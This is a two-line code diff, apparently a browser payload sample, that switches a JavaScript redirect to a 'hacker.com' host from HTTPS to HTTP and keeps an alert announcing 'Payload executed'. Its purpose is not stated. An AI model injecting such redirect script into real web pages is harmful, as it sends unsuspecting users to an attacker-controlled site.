@@ -1,2 +1,2 @@
-document.location = "https://hacker.com";
+document.location = "http://hacker.com";
 alert("Payload executed");
